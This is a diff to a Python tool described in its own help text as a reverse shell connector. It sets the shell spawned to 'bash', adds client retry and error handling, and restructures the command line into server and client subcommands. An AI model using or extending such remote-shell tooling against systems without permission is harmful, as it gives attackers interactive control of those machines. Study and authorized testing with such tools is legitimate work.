@@ -24,7 +24,7 @@ import selectors
 from subprocess import Popen
 
 
-SHELL='bash -i'
+SHELL='bash'
 STDIN = sys.stdin.fileno()
 # STDIN = sys.stdin
 STDOUT = sys.stdout.fileno()
@@ -68,7 +68,7 @@ def socketshell(sock, size):
                 fd = key.fileobj
                 if fd == sock:
                     data = sock.recv(1024)
-                    print("recv:", data)
+                    # print("recv:", data)
                     
                     # 在peer挂掉的情况下会出现
                     if data == b"":
@@ -151,6 +151,10 @@ def server(addr, port):
 
 
 def client(addr, port=6789):
+    if addr == "":
+        print("client 需要 server 地址")
+        return
+    
     server_addr = (addr, port)
 
     # sock = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
@@ -166,6 +170,11 @@ def client(addr, port=6789):
             print(f"服务端口关闭，等待重新打开。。。")
             time.sleep(10)
             continue
+        except Exception:
+            traceback.print_exc()
+            time.sleep(10)
+            continue
+
 
         # 拿到初始化终端大小
         """
@@ -193,35 +202,42 @@ def client(addr, port=6789):
 
 def main():
     parse = argparse.ArgumentParser(
-        usage="%(prog)s <--server|--client>",
+        usage="%(prog)s <命令> [option]",
         description="反向shell连接",
         epilog="END",
     )
 
-    parse.add_argument("--server", action="store_true", help="启动server端")
-    parse.add_argument("--client", action="store_true", help="使用client端")
-    parse.add_argument("--addr", default="", help="需要连接的IP或域名")
-    parse.add_argument("--port", default=6789, type=int, help="端口")
+    # parse.add_argument("--client", action="store_true", help="使用client端")
+    # parse.add_argument("--addr", default="", help="需要连接的IP或域名")
+    # parse.add_argument("--port", default=6789, type=int, help="端口")
+
+    subparsers = parse.add_subparsers(title="指令", metavar="")
+    server_func =  subparsers.add_parser("server", help="启动服务端")
+    client_func = subparsers.add_parser("client", help="使用client端")
+
+    server_func.add_argument("--cmd", default=SHELL, help=f"需要使用的交互程序(default: {SHELL})")
+    server_func.add_argument("--addr", default="", help="需要连接的IP或域名")
+    server_func.add_argument("--port", default=6789, type=int, help="端口")
+
+    client_func.add_argument("--addr", default="", help="需要连接的IP或域名")
+    client_func.add_argument("--port", default=6789, type=int, help="端口")
 
     parse.add_argument("--parse", action="store_true", help=argparse.SUPPRESS)
+
+    server_func.set_defaults(func=lambda args :server(args.addr, args.port))
+    
+    client_func.set_defaults(func=lambda args :client(args.addr, args.port))
 
     args = parse.parse_args()
 
     if args.parse:
         print(args)
         sys.exit(0)
-
-    if args.server:
-        server(args.addr, args.port)
     
-    elif args.client:
-        if args.client == "":
-            print("客户端需要 IP OR domainname")
-            sys.exit(1)
-        client(args.addr, args.port)
-    else:
-        parse.print_help()
-        sys.exit(1)
+    return args.func(args)
+
+    # parse.print_help()
+    # sys.exit(1)
 
 
 if __name__ == "__main__":
